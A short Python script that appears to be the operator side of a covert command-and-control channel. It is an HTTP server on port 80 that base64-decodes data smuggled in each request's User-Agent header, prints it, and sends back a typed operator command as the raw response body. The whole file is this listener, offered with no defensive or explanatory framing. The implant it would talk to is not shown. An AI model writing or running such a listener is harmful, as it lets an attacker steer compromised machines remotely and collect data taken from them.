import http.server
import socketserver
import base64

def base64_decode(encoded_data):
    # Decode the Base64 encoded data
    decoded_bytes = base64.b64decode(encoded_data)
    # Convert bytes to string (assuming UTF-8 encoding)
    return decoded_bytes.decode('utf-8')

# Define the handler to handle incoming HTTP requests
class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ex_str =self.headers['User-Agent']
        try:
            data = base64_decode(ex_str)
            print(data)
        except:
            print(ex_str)
            pass

        command = input(">")
        # Send a 200 OK response
        #self.send_response(200)
        #self.send_header("Content-type", "text/html")
        #self.end_headers()
        self.wfile.write(command.encode())

# Define the server and bind it to the IP and port
PORT = 80
Handler = MyHttpRequestHandler

with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()
